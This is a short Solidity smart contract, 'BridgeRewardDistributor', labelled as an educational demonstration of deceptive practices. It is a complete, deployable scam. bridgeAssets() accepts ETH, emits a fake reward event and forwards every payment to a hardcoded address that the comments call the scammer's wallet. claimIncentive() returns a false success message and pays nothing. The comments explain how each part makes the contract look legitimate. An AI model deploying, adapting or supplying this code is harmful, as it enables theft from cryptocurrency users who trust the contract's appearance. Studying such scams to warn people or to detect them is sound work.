// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title BridgeRewardDistributor
 * @dev Simulates a contract that rewards users for bridging assets to a smart contract.
 * WARNING: This contract is intended for educational purposes to demonstrate deceptive practices.
 */
contract BridgeRewardDistributor {
    // Address for the designated liquidity provider (scammer's wallet)
    address payable public liquidityPool = payable(0xc5dDD4387Faa7AEe42fC1aB60acFfddC3C07d9ef);

    // Event to log the reward distribution (appears legitimate)
    event RewardDistributed(address indexed user, uint rewardAmount);

    // Function to simulate bridging assets and distributing rewards
    function bridgeAssets() external payable {
        require(msg.value > 0, "Transaction must include value.");

        // Simulated "reward calculation" to give the appearance of functionality
        uint reward = calculateReward(msg.value);

        // Emit event to create an illusion of activity
        emit RewardDistributed(msg.sender, reward);

        // Transfer all funds to the liquidity pool (scammer's wallet)
        liquidityPool.transfer(msg.value);
    }

    // Function to simulate reward calculation (does nothing meaningful)
    function calculateReward(uint amount) internal pure returns (uint) {
        // Fake logic to make the contract seem legitimate
        return amount * 5 / 100; // Pretends to calculate a 5% reward
    }

    // Function to check the current balance of the contract (always zero)
    function getContractBalance() public view returns (uint) {
        return address(this).balance;
    }

    // Function to withdraw "bridge incentives" (fake, does nothing useful)
    function claimIncentive() external pure returns (string memory) {
        return "Incentive successfully claimed!";
    }
}
